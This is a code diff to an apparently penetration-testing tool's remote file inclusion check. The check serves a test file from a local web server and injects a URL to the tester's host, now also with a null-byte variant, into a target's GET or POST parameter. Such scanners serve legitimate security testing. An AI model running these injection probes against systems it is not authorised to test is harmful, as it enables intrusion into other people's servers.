@@ -56,7 +56,7 @@ def serve_forever():
     try:
         with socketserver.TCPServer(("", rfi_test_port), ServerHandler) as httpd:
             if(args.verbose):
-                print("[i] Opening local web server on port " +  str(rfi_test_port) + " and setting up 'rfitest' that will be used as test inclusion")
+                print("[i] Opening temporary local web server on port " +  str(rfi_test_port) + " and setting up 'rfitest' that will be used as test inclusion")
             
             rfiTestPath = webDir + os.path.sep + "rfitest"
 
@@ -532,16 +532,20 @@ def test_rfi(url):
                     raise
 
             threading.Thread(target=serve_forever).start()
-            test = "http://{0}:{1}/rfitest".format(args.lhost, str(rfi_test_port))
-            u = url.replace(args.param, test)
+            rfiTest = []
+            rfiTest.append("http://{0}:{1}/rfitest".format(args.lhost, str(rfi_test_port)))
+            rfiTest.append("http://{0}:{1}/rfitest%00".format(args.lhost, str(rfi_test_port)))
+            
+            for test in rfiTest:
+                u = url.replace(args.param, test)
 
-            if(not args.postreq):
-                _, br = GET(u, headers, proxies, "RFI", "RFI")
-                if(not br): return
-            else:
-                postTest = args.postreq.replace(args.param, test)
-                _, br = POST(url, headers, postTest, proxies, "RFI", "RFI")
-                if(not br): return
+                if(not args.postreq):
+                    _, br = GET(u, headers, proxies, "RFI", "RFI")
+                    if(not br): return
+                else:
+                    postTest = args.postreq.replace(args.param, test)
+                    _, br = POST(url, headers, postTest, proxies, "RFI", "RFI")
+                    if(not br): return
         except:
             raise
             pass
